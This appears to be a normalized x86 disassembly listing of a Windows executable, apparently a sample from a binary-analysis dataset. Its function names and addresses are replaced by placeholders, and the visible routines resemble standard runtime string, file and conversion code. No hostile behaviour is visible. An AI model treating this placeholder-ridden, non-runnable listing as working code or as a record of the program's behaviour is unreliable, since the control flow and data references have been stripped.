and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_43a070
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_43a134
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi ecx
mov [ ecx ] 0x2d
inc ecx
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
cmp edx 0x9
jbe r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ ecx ] dl
inc ecx
test eax eax
ja r-xdata
mov dl [ esi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ esi ] al
inc esi
cmp esi ecx
jb r-xdata
pop esi
pop ebp
retn 0x8
sub_43a178
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
mov ecx [ ebp + 0xc ]
call sub_43a134
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_43a1a2
push 0x10
push r--data
call sub_42b398
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
call sub_425eb1
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
push 0x1
push edi
push [ ebp + 0x8 ]
call sub_42d253
add esp 0xc
mov esi eax
cmp esi 0xffffffff
je r-xdata
or [ ebp - 0x1c ] 0xffffffff
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_42d253
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp esi eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43a297
mov eax [ ebp - 0x1c ]
push edi
push esi
push [ ebp + 0x8 ]
call sub_42d253
add esp 0xc
jmp r-xdata
sub_43a2a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_43a431
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_43a431
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_43a38b
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43a2a1
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_43a431
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_423619
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_43a4e6
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_438444
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43a4e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_43a55c
cmp [ rw-data ] 0x0
je sub_43a576
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_43a576
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_440107
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_440b06
push 0x0
mov eax sub_4400d1
call sub_425dad
push r--data
mov ecx rw-data
call sub_403dc1
and [ ebp - 0x4 ] 0x0
push r--data
mov ecx rw-data
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x5
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0xc
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0xd
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0xe
call sub_403dc1
mov [ ebp - 0x4 ] 0xf
push r--data
mov ecx rw-data
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x10
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x11
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x12
call sub_403dc1
push r--data
mov ecx rw-data
mov [ ebp - 0x4 ] 0x13
call sub_403dc1
push sub_441076
call sub_424852
pop ecx
call sub_425e4c
retn
sub_401000
mov [ ecx ] r--data
jmp sub_4238ce
sub_40100b
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4238ce
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40102d
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424139
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_40109a
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_40415f
mov ecx esi
pop esi
jmp sub_4238ce
sub_4010b7
push esi
mov esi ecx
call sub_40109a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4010d3
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_401065
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4010eb
mov [ ecx ] r--data
jmp sub_40109a
sub_4010f6
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40109a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4011f5
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_401212
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40122f
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40124c
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_401269
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_401286
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4012a3
mov [ ecx ] r--data
retn
sub_4012aa
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4012c7
mov [ ecx + 0x18 ] r--data
mov [ ecx + 0x14 ] r--data
mov [ ecx + 0x10 ] r--data
mov [ ecx + 0xc ] r--data
mov [ ecx + 0x8 ] r--data
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_4012f8
push esi
mov esi ecx
call sub_4012c7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_401adc
xor eax eax
push eax
push eax
push [ ecx + 0x18 ]
mov [ rw-data ] eax
push sub_4027a7
push eax
push eax
call sub_423b4f
add esp 0x18
mov [ rw-data ] eax
retn
sub_401afd
cmp [ esp + 0x4 ] 0x9
jne r-xdata
retn 0x4
inc [ rw-data ]
mov [ rw-data ] 0xea60
sub_401b17
mov al 0x1
retn 0x4
sub_401d38
retn 0x8
sub_402027
retn 0xc
sub_40421b
push 0x24
call sub_4246c6
pop ecx
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] eax
retn
mov [ ecx ] eax
sub_4045c0
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
push 0x0
push 0x0
call sub_42597b
int3
sub_4045d3
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_401118
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4046b8
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_40415f
push esi
push esi
call sub_42597b
int3
sub_40478f
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_423871
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4048ca
sub ecx 0x4
jmp sub_4012f8
sub_4048d2
sub ecx 0x8
jmp sub_4012f8
sub_4048da
sub ecx 0xc
jmp sub_4012f8
sub_4048e2
sub ecx 0x10
jmp sub_4012f8
sub_4048ea
sub ecx 0x14
jmp sub_4012f8
sub_4048f2
sub ecx 0x18
jmp sub_4012f8
sub_4048fa
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_401065
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_404912
mov [ ecx ] r--data
jmp sub_40109a
sub_40491d
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40109a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40493f
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_401118
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_40498e
mov [ ecx ] r--data
retn
sub_404995
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4049b2
push 0x0
push 0x1
lea ecx [ esi + 0x1c ]
call sub_40415f
push 0x0
push 0x1
mov ecx esi
call sub_40415f
retn
j_sub_404bcd
jmp sub_404bcd
sub_404cb9
push edi
mov edi eax
call sub_405102
push [ edi ]
call sub_42412e
pop ecx
pop edi
retn
sub_404f5e
call sub_413499
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ esi + 0x1c ] 0x0
retn
sub_405519
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
push 0x0
push 0x0
call sub_42597b
int3
sub_40568a
mov [ ecx ] r--data
retn
sub_405691
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_405fe6
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_40415f
mov ecx esi
pop esi
jmp sub_4238ce
sub_406003
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_406011
push esi
mov esi ecx
call sub_405fe6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4061b0
mov [ ecx ] r--data
retn
sub_4061b7
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
call sub_406175
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_4061cf
push ebp
mov ebp esp
push ecx
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x18
push eax
call sub_403de3
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40630b
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_4230d0
pop ecx
pop ecx
retn 0x4
sub_40634a
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_42323d
pop ecx
pop ecx
retn 0x4
sub_406389
mov al [ esp + 0x4 ]
retn 0x4
sub_406390
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x1c ]
pop ebp
retn 0xc
sub_4063da
mov al [ esp + 0x4 ]
retn 0x8
sub_40642e
push esi
mov esi ecx
call sub_4062de
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_406485
mov [ ecx ] r--data
jmp sub_405fe6
sub_406595
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
mov [ esi ] ecx
call sub_40614d
mov eax esi
retn
sub_4065a4
push esi
mov esi ecx
mov [ esi ] r--data
call sub_405fe6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4065c6
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_4060e2
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_406602
lea eax [ ecx + 0x2c ]
retn
sub_406606
lea eax [ ecx + 0x1c4 ]
retn
sub_40660d
mov eax [ ecx + 0x16c ]
retn
sub_406614
push esi
mov esi ecx
call sub_40670b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_408986
push esi
mov esi eax
add esi 0x4c
mov ecx esi
call sub_408ded
push esi
mov [ esi ] r--data
call sub_422c43
pop ecx
pop esi
retn
sub_408a01
xor eax eax
mov [ ecx + 0x488 ] al
mov [ ecx + 0x237 ] al
mov [ ecx + 0x48c ] eax
jmp sub_40ba57
sub_408a1a
xor eax eax
mov [ ecx + 0x237 ] al
mov [ ecx + 0x488 ] al
mov [ ecx + 0x48c ] eax
retn
sub_408a2f
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_408b5b
push ecx
mov [ ecx ] r--data
call sub_422c43
pop ecx
retn
sub_408b69
push ecx
mov eax [ edx + 0x8 ]
or eax [ esp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx eax
push edx
call sub_406490
pop ecx
retn 0x8
or eax 0x4
sub_408bb3
or eax 0xffffffff
retn 0x4
sub_408bb9
or eax 0xffffffff
retn
sub_408be2
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0xffffffff
push [ esp + 0xc ]
call [ eax + 0x1c ]
retn 0x8
sub_408cec
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x10
sub_408d06
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x20
sub_408d20
mov eax ecx
retn 0x8
sub_408d25
xor eax eax
retn
sub_408d28
retn 0x4
sub_409311
push esi
mov esi ecx
call sub_408b8a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40932d
push esi
mov esi ecx
call sub_4061b7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_409349
push esi
lea esi [ ecx - 0x4c ]
mov eax esi
call sub_408986
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_409368
push esi
mov esi ecx
call sub_408e42
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_409c20
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_409c3d
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_404490
push [ esp + 0x8 ]
mov ecx esi
push [ esp + 0x8 ]
call sub_404371
mov eax esi
retn 0x8
sub_409c61
push 0x4
mov eax sub_43e4f1
call sub_425de0
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0x10 ] 0x2
je r-xdata
call sub_425e4c
retn
call sub_408b2a
sub_409c8a
mov eax r-xdata
retn
sub_409ddc
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
retn
lea ecx [ eax + 0x4 ]
jmp sub_4230b7
sub_40a4fe
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40a515
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
